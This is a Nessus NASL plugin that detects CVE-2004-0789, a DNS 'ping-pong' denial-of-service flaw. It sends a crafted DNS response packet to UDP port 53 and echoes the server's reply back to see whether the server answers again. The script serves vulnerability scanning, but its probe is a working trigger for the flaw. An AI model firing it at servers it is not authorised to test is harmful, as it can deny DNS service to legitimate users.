#
# Multiple Vendor DNS Response Flooding Denial Of Service
# NISCC Vulnerability Advisory 758884/NISCC/DNS
# http://www.uniras.gov.uk/vuls/2004/758884/index.htm
# by Cedric Tissieres <cedric dot tissieres at objectif-securite dot ch>
#
# Modified by Tenable Network Security to slightly change the way the 
# query is performed and the vulnerability is detected.
#
# This script is released under the GNU GPLv2
#

if(description)
{
 script_id(15753);
 script_version("$Revision: 1.3 $");
 script_bugtraq_id(11642);
 script_cve_id("CVE-2004-0789");	
 script_name(english:"Multiple Vendor DNS Response Flooding Denial Of Service");
 desc["english"] = "
Multiple DNS vendors are reported susceptible to a denial of service 
vulnerability (Axis Communication, dnrd, Don Moore, Posadis).

This vulnerability results in vulnerable DNS servers entering into an infinite 
query and response message loop, leading to the consumption of network and 
CPU resources, and denying DNS service to legitimate users. 

An attacker may exploit this flaw by finding two vulnerable servers and
set up a 'ping-pong' attack between the two hosts.

Solution : http://www.uniras.gov.uk/vuls/2004/758884/index.htm
Risk factor : Medium";

 script_description(english:desc["english"]);
 script_summary(english:"send malformed DNS query on port 53");
 script_category(ACT_ATTACK);
 script_family(english:"Denial of Service");
 script_copyright(english:"This script is (C)2004 Cedric Tissieres, Objectif Securite");
 script_require_ports(53);
 script_require_keys("DNS/udp/53");
 script_dependencies("dns_server.nasl");
 exit(0);
}

#
# The script code starts here
#


if ( islocalhost() ) exit(0);

if(get_port_state(53))
{
   soc = open_sock_udp ( 53 );
   if ( ! soc ) exit(0);
   my_data = string("\xf2\xe7\x81\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77");
   my_data = my_data + string("\x77\x77\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00");
   my_data = my_data + string("\x00\x01\x00\x01");
   send(socket:soc, data:my_data);
   r = recv(socket:soc, length:4096);
   if ( r && ( ord(r[2]) & 0x80 ) ) 
   {
   send(socket:soc, data:r);
   r = recv(socket:soc, length:4096);
   if ( r && ( ord(r[2]) & 0x80 ) )  security_warning(port:53, proto:"udp");
   }
}
   
